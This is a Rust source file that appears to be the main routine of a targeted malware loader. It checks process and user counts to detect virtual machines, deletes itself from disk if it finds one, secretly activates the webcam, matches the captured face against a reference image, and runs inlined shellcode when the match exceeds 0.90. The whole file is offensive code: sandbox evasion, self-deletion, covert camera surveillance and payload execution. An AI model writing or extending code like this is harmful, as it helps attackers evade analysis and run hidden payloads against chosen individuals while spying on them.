#![no_main]
extern crate alloc;

use alloc::boxed::Box;
use alloc::vec::Vec;
use core::error::Error;
use opencv::prelude::VideoCaptureTrait;
use opencv::Result;

mod modules; // Import the modules
use modules::camera::init_camera;
use modules::classifier::init_face_classifier;
use modules::face_detection::{detect_faces, process_reference_image};
use modules::similarity::calculate_similarity;

extern "C" {
    // Function declaration
    fn GetProcessCountViaSnapShot(dwProcessCount: *mut u32) -> bool;
    fn GetUniqueUserCountViaSnapshot(dwUserCount: *mut u32) -> bool;
    fn VmDetection(process_count_per_user: f32) -> bool;
    fn InlinedShellcodeExecution();
    fn DeleteSelfFromDisk() -> bool;

}
#[no_mangle]
fn main() -> Result<(), Box<dyn Error>> {
    let mut user_count: u32 = 0;
    let mut proc_count: u32 = 0;

    unsafe {
        if !GetProcessCountViaSnapShot(&mut proc_count as *mut u32) {
            return Ok(());
        }

        if !GetUniqueUserCountViaSnapshot(&mut user_count as *mut u32) {
            return Ok(());
        }

        let proc_per_user_ratio: f32 = (proc_count / user_count) as f32;

        if !VmDetection(proc_per_user_ratio){
            println!("[-] VM detected. Self-deleting.");
            DeleteSelfFromDisk(); // We are running in a virtual machine
            return Ok(());
        }

    }
    println!("[+] Bare metal machine detected.");
    // if we pass the check built by our Decision tree, continue

    let mut face_classifier = init_face_classifier()?;
    let mut cam = init_camera()?;

    println!("[+] Camera initialization done.");

    let mut frame = opencv::core::Mat::default();
    let mut embeddings = Vec::new();

    // Detect faces in the live video feed
    detect_faces(&mut cam, &mut face_classifier, &mut frame, &mut embeddings)?;

    println!("[+] Detected face.");

    // Turn camera off
    cam.release().expect("[-] Failed to close camera!");

    // Process the reference image and detect faces
    process_reference_image(&mut face_classifier, &mut embeddings)?;

    // Calculate similarity between embeddings
    let similarity = calculate_similarity(&embeddings)?;

    println!("[+] Similarity score: {:#?}", similarity);

    if similarity > 0.90 {

        println!("[+] Target detected! Running shellcode...");

        unsafe{
            InlinedShellcodeExecution();
        }

    }else{

        println!("[-] Target NOT detected! Trying again later...");

    }

    Ok(())
}
